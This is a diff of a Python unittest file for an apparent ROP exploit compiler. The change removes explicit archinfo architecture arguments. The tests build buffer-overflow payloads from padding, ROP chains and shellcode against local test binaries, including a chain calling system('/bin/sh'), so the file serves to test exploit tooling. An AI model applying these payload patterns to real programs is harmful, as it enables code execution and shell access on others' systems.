@@ -1,5 +1,4 @@
 import sys, logging, unittest, binascii, os, signal
-import archinfo
 from pwn import *
 import rop_compiler.ropme as ropme
 
@@ -74,7 +73,7 @@ class BofTests(unittest.TestCase):
     buffer_address = int(line.split(":")[1],16)
 
     target_address = buffer_address + 1024
-    rop = ropme.rop_to_shellcode([(filename, None, None)], [], target_address, archinfo.ArchAMD64(), logging.DEBUG, True)
+    rop = ropme.rop_to_shellcode([(filename, None, None)], [], target_address, logging.DEBUG, True)
     payload = 'A'*512 + 'B'*8 + rop
     payload += ((1024 - len(payload)) * 'B') + self.shellcode_amd64()
 
@@ -112,12 +111,12 @@ class BofTests(unittest.TestCase):
 
   def bof_many_args(self, is_64bit):
     if is_64bit:
-      filename, arch = e('bof_many_args'), archinfo.ArchAMD64()
+      filename = e('bof_many_args')
     else:
-      filename, arch = e('bof_many_args_x86'), archinfo.ArchX86()
+      filename = e('bof_many_args_x86')
 
     files = [(filename, None, None)]
-    rop = ropme.rop(files, [], [["function", "callme", 11,12,13,14,15,16,17,18]], arch = arch, log_level = logging.DEBUG)
+    rop = ropme.rop(files, [], [["function", "callme", 11,12,13,14,15,16,17,18]], log_level = logging.DEBUG)
     if is_64bit:
       payload = 'A'*512 + 'B'*8 + rop
     else:
@@ -192,7 +191,7 @@ class BofTests(unittest.TestCase):
     p = process([filename,'3000'])
 
     files = [(filename, None, None)]
-    rop = ropme.rop(files, ["/lib/i386-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(self.shellcode_x86())]], arch = archinfo.ArchX86(), log_level = logging.DEBUG)
+    rop = ropme.rop(files, ["/lib/i386-linux-gnu/libc.so.6"], [["shellcode_hex", binascii.hexlify(self.shellcode_x86())]], log_level = logging.DEBUG)
 
     payload = 'A'*512 + ('B'*16) + rop
     p.writeline(payload)
@@ -215,7 +214,7 @@ class BofTests(unittest.TestCase):
 
     goals = [ ["function", "system", "/bin/sh"] ]
     files = [(filename, None, None), (libc, libc_gadgets, libc_address)]
-    rop = ropme.rop(files, [libc], goals, arch = archinfo.ArchX86(), log_level = logging.DEBUG)
+    rop = ropme.rop(files, [libc], goals, log_level = logging.DEBUG)
 
     p.writeline("2")
     p.writeline('A'*272 + rop)
@@ -252,7 +251,7 @@ class BofTests(unittest.TestCase):
 
     files = [(filename, None, None), (libc, libc_gadgets, libc_address)]
     goals = [["shellcode_hex", binascii.hexlify(self.shellcode_x86())]]
-    rop = ropme.rop(files, [], goals, arch = archinfo.ArchX86(), log_level = logging.DEBUG, bad_bytes = bad_bytes)
+    rop = ropme.rop(files, [], goals, log_level = logging.DEBUG, bad_bytes = bad_bytes)
 
     self.assertFalse(self.contains_bad_bytes(rop, bad_bytes), "Bad bytes found in ROP payload for {} exploit".format(filename))
 
